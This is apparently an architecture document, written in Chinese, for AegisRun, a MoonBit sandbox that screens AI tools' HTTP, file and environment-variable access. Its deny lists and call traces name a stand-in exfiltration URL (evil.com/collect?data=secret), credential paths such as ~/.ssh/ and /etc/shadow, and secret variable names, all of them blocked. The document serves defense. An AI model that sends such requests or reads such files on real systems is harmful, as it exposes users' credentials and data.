# AegisRun 架构文档

> 版本: v0.1.0 | MoonBit 0.1.20260608 | 2026-06-22

---

## 目录

1. [整体架构](#整体架构)
2. [核心模块详解](#核心模块详解)
3. [完整调用链](#完整调用链)
4. [数据结构](#数据结构)
5. [扩展指南](#扩展指南)

---

## 整体架构

```
┌─────────────────────────────────────────────────────────┐
│                      用户代码                            │
│  let sb = @lib.standard_sandbox()                       │
│  sb.sandbox_http_request("https://evil.com/collect")     │
└──────────────────────┬──────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────┐
│              沙箱拦截层 (src/lib/sandbox.mbt)             │
│                                                         │
│  sandbox_http_request()  ← 所有 HTTP 请求的唯一出口       │
│  sandbox_file_open()     ← 所有文件操作的唯一出口          │
│  sandbox_getenv()        ← 所有环境变量的唯一出口          │
│  sandbox_check_timeout() ← 超时限制                       │
│  sandbox_check_memory()  ← 内存限制                       │
│                                                         │
│  每个函数执行两关检查:                                    │
│    第一关: 调用黑名单引擎 → 全局规则检查                    │
│    第二关: 遍历 SandboxGrant → 工具授权检查               │
└──────────────────────┬──────────────────────────────────┘
                       │ 第一关调用
┌──────────────────────▼──────────────────────────────────┐
│           黑名单引擎 (src/lib/core.mbt)                   │
│                                                         │
│  check_domain()  → HashMap 精确匹配 + 后缀通配 + IP前缀    │
│  check_path()    → HashMap 精确匹配 + 前缀目录            │
│  check_env()     → 显式模式匹配 + KEY/SECRET/TOKEN检测    │
│  check_tool_id() → HashMap 查表                          │
│                                                         │
│  策略引擎:                                               │
│  new_policy_engine()      → 创建 + 加载 standard 预设      │
│  load_standard_preset()   → 填充初始规则                  │
└─────────────────────────────────────────────────────────┘
```

### 三层职责

| 层 | 文件 | 职责 | 调用方 |
|:--|------|------|------|
| 沙箱拦截层 | `sandbox.mbt` | 工具IO唯一出口，强制执行两关检查 | 用户代码 |
| 黑名单引擎 | `core.mbt` | 规则匹配，回答 Allow/Deny | 沙箱层、扫描器、CLI |
| 演示/测试层 | `scenarios.mbt`, `scanner.mbt`, `sandbox_demo.mbt` | 验证引擎正确性 | — |

---

## 核心模块详解

### 1. 黑名单引擎 (core.mbt)

#### 1.1 域名检查: `check_domain()`

```
函数签名:
  pub fn check_domain(
    exact_bl     : HashMap[String, String],   // 精确黑名单
    suffix_patterns : Array[String],          // 后缀通配 ["*.cn", "*.ru"]
    domain       : String,                    // 待检查域名
  ) -> Decision                                // Allow | Deny

调用示例:
  let bl = get_blacklist_domains(policy)
  let suffixes = get_domain_suffixes(policy)
  check_domain(bl, suffixes, "evil.com")

执行流程:
  ┌─ ① HashMap.get("evil.com")
  │    → Some("known-malware-c2")
  │    → println("[INFO] exact-match: evil.com")
  │    → return Deny                          // 命中，结束
  │
  │  若 None:
  ├─ ② 遍历 suffix_patterns ["*.cn", "*.ru", "*.tk"]
  │    "*.cn" → 剥离 "*" → suffix = ".cn"
  │    "evil.com".has_suffix(".cn")? → No
  │    "*.ru" → suffix = ".ru"
  │    "evil.com".has_suffix(".ru")? → No
  │    "*.tk" → 同上 → No
  │    → 未命中
  │
  ├─ ③ IP 前缀匹配（硬编码）
  │    split_domain("192.168.1.100") → ["192", "168", "1", "100"]
  │    parts[0] = "192", parts[1] = "168"
  │    "192." + "168." = "192.168." → 命中
  │    → println("[INFO] ip-prefix: 192.168.* -> 192.168.1.100")
  │    → return Deny
  │
  │    parts[0] = "10"
  │    "10." → 命中 → return Deny
  │
  │    parts[0] = "172"
  │    "172." → 命中 → return Deny
  │
  └─ ④ 全部未命中 → return Allow
```

#### 1.2 路径检查: `check_path()`

```
函数签名:
  pub fn check_path(
    exact_paths   : HashMap[String, String],   // 精确黑名单
    prefix_patterns : Array[String],           // 前缀拦截 ["~/.ssh/", "C:\\Windows\\"]
    path          : String,                    // 待检查路径
  ) -> Decision

执行流程:
  ┌─ ① HashMap.get("/etc/shadow")
  │    → Some("sensitive")
  │    → println("[INFO] exact-path: /etc/shadow")
  │    → return Deny                          // 命中
  │
  │  若 None:
  ├─ ② 遍历 prefix_patterns ["/etc/passwd", "/etc/shadow", "~/.ssh/", ...]
  │    "~/.ssh/" → "~/.ssh/id_rsa".has_prefix("~/.ssh/")? → Yes
  │    → println("[INFO] prefix-path: ~/.ssh/ -> ~/.ssh/id_rsa")
  │    → return Deny                          // 命中
  │
  └─ ③ 全部未命中 → return Allow
```

#### 1.3 环境变量检查: `check_env()`

```
函数签名:
  pub fn check_env(
    sensitive : Array[String],    // 显式敏感模式
    varname   : String,            // 待检查变量名
  ) -> Decision

执行流程:
  ┌─ ① 显式模式匹配
  │    遍历 ["AWS_SECRET", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "DATABASE_URL"]
  │    "OPENAI_API_KEY".contains("OPENAI_API_KEY")? → Yes
  │    → println("[INFO] sensitive-pattern: OPENAI_API_KEY matches OPENAI_API_KEY")
  │    → return Deny
  │
  │  若未命中:
  ├─ ② 关键词检测
  │    varname.to_upper() → "GITHUB_TOKEN"
  │    包含 "KEY"? → No
  │    包含 "SECRET"? → No
  │    包含 "TOKEN"? → Yes
  │    → return Deny
  │
  │    关键词列表: KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL
  │
  └─ ③ 全部未命中 → return Allow
```

### 2. 沙箱拦截层 (sandbox.mbt)

#### 2.1 创建沙箱

```
standard_sandbox()
  │
  ├─ new_policy_engine()
  │   │
  │   ├─ 创建 HashMap × 4（黑名单域名/路径/工具 + 白名单域名）
  │   ├─ 预设敏感环境变量列表
  │   ├─ 空后缀/前缀匹配数组
  │   │
  │   └─ load_standard_preset(state)
  │       往 blacklist_domains 填入:
  │         "evil.com" → "known-malware-c2"
  │         "stealer.cc" → "data-exfil-host"
  │         "192.168.*" → "internal-network"
  │         "10.*" → "private-network"
  │         "172.16.*" → "private-network"
  │         "127.0.0.1" → "loopback"
  │         "localhost" → "loopback"
  │       往 domain_suffix_patterns 填入:
  │         ["*.cn", "*.ru", "*.tk"]
  │       往 blacklist_paths 填入:
  │         "/etc/passwd" → "sensitive"
  │         "/etc/shadow" → "sensitive"
  │         "~/.ssh/" → "sensitive"
  │         "~/.aws/" → "sensitive"
  │         "C:\\Windows\\" → "sensitive"
  │       往 path_prefix_patterns 填入:
  │         ["/etc/passwd", "/etc/shadow", "~/.ssh/", "~/.aws/", "C:\\Windows\\"]
  │       往 whitelist_domains 填入:
  │         "api.github.com" → "GitHub-API"
  │         "wttr.in" → "weather-API"
  │
  ├─ default_grant()
  │   返回 SandboxGrant {
  │     allowed_domains: ["wttr.in", "api.github.com"],
  │     allowed_paths: ["/tmp/reports/", "/tmp/logs/"],
  │     allowed_env_vars: ["USER", "LANG", "HOME"],
  │     max_timeout_ms: 30000,
  │     max_memory_kb: 262144,
  │     max_file_size_kb: 10240,
  │   }
  │
  └─ new_sandbox(policy, grant)
      Sandbox { policy, grant, checked_count: 0, blocked_count: 0 }
```

#### 2.2 网络拦截: `sandbox_http_request()`

```
sandbox_http_request("https://evil.com/collect?data=x")
  │
  ├─ self.checked_count += 1
  │
  ├─ extract_host("https://evil.com/collect?data=x")
  │   ├─ 剥 https:// → "evil.com/collect?data=x"
  │   ├─ 切第一个 / → "evil.com"
  │   └─ return "evil.com"
  │
  ├─ 第一关: check_domain(policy.blacklist_domains, suffix_patterns, "evil.com")
  │   → Deny (exact-match)
  │
  ├─ self.blocked_count += 1
  └─ return Err("BLOCKED: domain 'evil.com' is blacklisted")


sandbox_http_request("https://wttr.in/Shenzhen")
  │
  ├─ self.checked_count += 1
  ├─ extract_host → "wttr.in"
  │
  ├─ 第一关: check_domain(..., "wttr.in")
  │   → Allow (不在黑名单)
  │
  ├─ 第二关: 遍历 grant.allowed_domains
  │   "wttr.in" == "wttr.in"? → Yes → granted = true
  │
  └─ return Ok("[sandbox] HTTP https://wttr.in/Shenzhen → ALLOWED")
```

#### 2.3 文件拦截: `sandbox_file_open()`

```
sandbox_file_open("/etc/passwd")
  │
  ├─ self.checked_count += 1
  │
  ├─ 第一关: check_path(policy.blacklist_paths, prefix_patterns, "/etc/passwd")
  │   → Deny (exact-path)
  │
  ├─ self.blocked_count += 1
  └─ return Err("BLOCKED: path '/etc/passwd' is blacklisted")


sandbox_file_open("/tmp/logs/access.log")
  │
  ├─ self.checked_count += 1
  │
  ├─ 第一关: check_path(..., "/tmp/logs/access.log")
  │   → Allow (不在黑名单)
  │
  ├─ 第二关: 遍历 grant.allowed_paths
  │   "/tmp/logs/access.log".has_prefix("/tmp/logs/")? → Yes → granted = true
  │
  └─ return Ok("[sandbox] open(/tmp/logs/access.log) → ALLOWED")
```

#### 2.4 环境变量拦截: `sandbox_getenv()`

```
sandbox_getenv("GITHUB_TOKEN")
  │
  ├─ self.checked_count += 1
  │
  ├─ 第一关: check_env(policy.sensitive_envs, "GITHUB_TOKEN")
  │   显式模式: 未命中
  │   关键词: "GITHUB_TOKEN".to_upper() 含 "TOKEN"? → Yes
  │   → Deny
  │
  ├─ self.blocked_count += 1
  └─ return Err("BLOCKED: env var 'GITHUB_TOKEN' is sensitive")
```

---

## 完整调用链

### 场景: 恶意工具试图外泄数据

```
用户代码:
  import aegisrun/lib
  let sb = @lib.standard_sandbox()
  let result = sb.sandbox_http_request("https://evil.com/collect?data=secret")

═══════════════════════════════════════════════════════════
调用栈展开:
═══════════════════════════════════════════════════════════

[1] sb.sandbox_http_request("https://evil.com/collect?data=secret")
    位置: src/lib/sandbox.mbt:50
    作用: 工具所有 HTTP 请求的唯一出口

    [2] extract_host("https://evil.com/collect?data=secret")
        位置: src/lib/sandbox.mbt:185
        返回: "evil.com"

    [3] check_domain(exact_bl, suffix_patterns, "evil.com")
        位置: src/lib/core.mbt:37
        作用: 检查域名是否在黑名单中

        [4] exact_bl.get("evil.com")
            位置: src/lib/core.mbt:41
            类型: HashMap<String, String>.get()
            复杂度: O(1)
            返回: Some("known-malware-c2")

        [5] println("[INFO] exact-match: evil.com")
            返回: Deny

    [3] 返回: Deny

    [6] self.blocked_count += 1
        checked_count: 0→1, blocked_count: 0→1

    [7] return Err("BLOCKED: domain 'evil.com' is blacklisted")

[1] 返回: Err(...)
═══════════════════════════════════════════════════════════

用户代码收到 Err → 写审计日志 → 返回 MCP PERMISSION_DENIED
HTTP 请求从未发出。整个调用链耗时 < 1μs。
```

### 场景: 正常工具查询天气

```
用户代码:
  let result = sb.sandbox_http_request("https://wttr.in/Shenzhen?format=3")

═══════════════════════════════════════════════════════════
调用栈展开:
═══════════════════════════════════════════════════════════

[1] sb.sandbox_http_request("https://wttr.in/Shenzhen?format=3")
    │
    [2] extract_host → "wttr.in"
    │
    [3] check_domain(exact_bl, suffix_patterns, "wttr.in")
        │
        [4] exact_bl.get("wttr.in") → None
        │
        [5] 遍历 suffix_patterns ["*.cn", "*.ru", "*.tk"]
            "wttr.in".has_suffix(".cn")? → No
            "wttr.in".has_suffix(".ru")? → No
            "wttr.in".has_suffix(".tk")? → No
        │
        [6] IP 前缀检查
            "wttr.in" 不以 "10." 开头 → No
            "wttr.in" 不以 "172." 开头 → No
            不是 IP → No
        │
        → return Allow

    [3] 返回: Allow

    [7] 第二关: 遍历 grant.allowed_domains
        "wttr.in" == "wttr.in"? → Yes → granted = true

    [8] return Ok("...")
═══════════════════════════════════════════════════════════

用户代码收到 Ok → 执行真正的 HTTP 请求 → 返回天气数据
```

---

## 数据结构

### PolicyState (策略引擎状态)

```
PolicyState {
  preset_name: String                        // "standard"
  blacklist_domains: HashMap<String, String>  // 域名 → 拦截原因
  blacklist_paths: HashMap<String, String>    // 路径 → 拦截原因
  blacklist_tools: HashMap<String, String>    // 工具ID → 拦截原因
  whitelist_domains: HashMap<String, String>  // 域名 → 放行原因
  sensitive_envs: Array<String>               // 敏感环境变量模式
  auto_grant_timeout_ms: Int                  // 30000
  auto_grant_memory_kb: Int                   // 262144
  domain_suffix_patterns: Array<String>       // ["*.cn", "*.ru", "*.tk"]
  path_prefix_patterns: Array<String>         // ["~/.ssh/", "C:\Windows\", ...]
}
```

### SandboxGrant (工具授权)

```
SandboxGrant {
  allowed_domains: Array<String>    // 授权域名白名单
  allowed_paths: Array<String>      // 授权路径白名单
  allowed_env_vars: Array<String>   // 授权环境变量白名单
  max_timeout_ms: Int               // 超时上限
  max_memory_kb: Int                // 内存上限
  max_file_size_kb: Int             // 单文件大小上限
}
```

### Sandbox (沙箱实例)

```
Sandbox {
  policy: PolicyState       // 全局策略（共享）
  grant: SandboxGrant       // 工具授权（每个工具不同）
  checked_count: Int        // 总检查次数
  blocked_count: Int        // 总拦截次数
}
```

### Decision (判定结果)

```
enum Decision {
  Allow   // 放行
  Deny    // 拦截
}
```

---

## 扩展指南

### 添加新的黑名单规则

修改 `load_standard_preset()`:

```moonbit
// 添加新域名到黑名单
state.blacklist_domains.set("new-threat.com", "emergency-block")

// 添加新后缀拦截
state.domain_suffix_patterns.push("*.xyz")

// 添加新敏感路径
state.blacklist_paths.set("/var/run/secrets/", "container-secrets")
state.path_prefix_patterns.push("/var/run/secrets/")

// 添加新环境变量模式
// 修改 default_blacklist_envs() 或在 load_standard_preset 中追加
```

### 添加新拦截器

在 `sandbox.mbt` 中仿照现有模式:

```moonbit
pub fn sandbox_sql_query(self : Sandbox, query : String, table : String) -> Result[String, String] {
  self.checked_count = self.checked_count + 1
  // 第一关: SQL 注入检测 / 表名黑名单
  // 第二关: grant.sql_tables 授权检查
  Ok("...")
}
```

### 接入真实 Wasm 运行时

沙箱函数将成为 wasm5 宿主函数:

```c
// wasm5 宿主函数 (C)
wasm5_result http_request(wasm5_instance* inst, const char* url) {
  // 调用 MoonBit 沙箱
  // aegisrun_sandbox_http_request(sandbox_ptr, url)
  // if Err → wasm5_trap("permission denied")
  // if Ok → 执行真实 HTTP
}
```

---

## 性能特征

| 操作 | 复杂度 | 说明 |
|------|:--:|------|
| 域名精确匹配 | O(1) | HashMap.get |
| 域名后缀匹配 | O(n) | n = suffix_patterns 数量 (3) |
| IP 前缀匹配 | O(1) | 硬编码 3 个前缀 |
| 路径精确匹配 | O(1) | HashMap.get |
| 路径前缀匹配 | O(m) | m = prefix_patterns 数量 (5) |
| 环境变量显式匹配 | O(k) | k = sensitive_envs 数量 (4) |
| 环境变量关键词 | O(1) | 5 个 contains 检查 |
| 授权检查 | O(g) | g = grant 数组长度 (2-3) |
| **总耗时** | **< 1μs** | 内存操作，无 IO |
